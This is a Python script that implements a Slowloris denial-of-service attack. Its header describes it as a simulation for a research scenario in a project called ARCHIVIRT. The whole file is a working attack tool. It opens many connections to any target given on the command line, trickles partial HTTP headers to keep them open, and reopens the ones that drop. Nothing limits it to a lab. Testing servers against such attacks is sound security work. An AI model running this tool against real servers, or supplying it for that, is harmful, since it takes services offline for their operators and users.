#!/usr/bin/env python3
"""
slowloris.py — Slow HTTP DoS simulation for ARCHIVIRT SCN-004
Author: Яснеманегре САВАДОГО (Аспирант СПбГУПТД)
Project: ARCHIVIRT
"""
import socket
import time
import argparse
import logging
import random

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')


def create_socket(host: str, port: int) -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((host, port))
    s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
    s.send(f"Host: {host}\r\n".encode())
    s.send(b"User-Agent: Mozilla/5.0 (ARCHIVIRT Slowloris Test)\r\n")
    s.send(b"Accept-language: en-US,en;q=0.5\r\n")
    return s


def slowloris(host: str, port: int, num_sockets: int, sleep_time: float, duration: float):
    socket_list = []
    start = time.time()
    logging.info(f"[*] Starting Slowloris: host={host} port={port} sockets={num_sockets}")

    # Initial socket flood
    for _ in range(num_sockets):
        try:
            socket_list.append(create_socket(host, port))
        except socket.error:
            pass

    logging.info(f"[+] Opened {len(socket_list)} initial connections")

    while time.time() - start < duration:
        elapsed = time.time() - start
        logging.info(f"[*] t={elapsed:.0f}s | Active sockets: {len(socket_list)}/{num_sockets}")

        # Send partial headers to keep connections alive
        for s in list(socket_list):
            try:
                s.send(f"X-Keep-Alive: {random.randint(1, 9999)}\r\n".encode())
            except socket.error:
                socket_list.remove(s)

        # Replenish dead sockets
        diff = num_sockets - len(socket_list)
        for _ in range(diff):
            try:
                socket_list.append(create_socket(host, port))
            except socket.error:
                pass

        time.sleep(sleep_time)

    logging.info("[*] Attack duration reached. Closing sockets.")
    for s in socket_list:
        try:
            s.close()
        except Exception:
            pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARCHIVIRT Slowloris DoS Simulator (SCN-004)")
    parser.add_argument("--host", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--sockets", type=int, default=150, help="Number of sockets (default: 150)")
    parser.add_argument("--sleep-time", type=float, default=15.0, help="Keep-alive interval seconds")
    parser.add_argument("--duration", type=float, default=120.0, help="Attack duration in seconds")
    args = parser.parse_args()

    slowloris(args.host, args.port, args.sockets, args.sleep_time, args.duration)
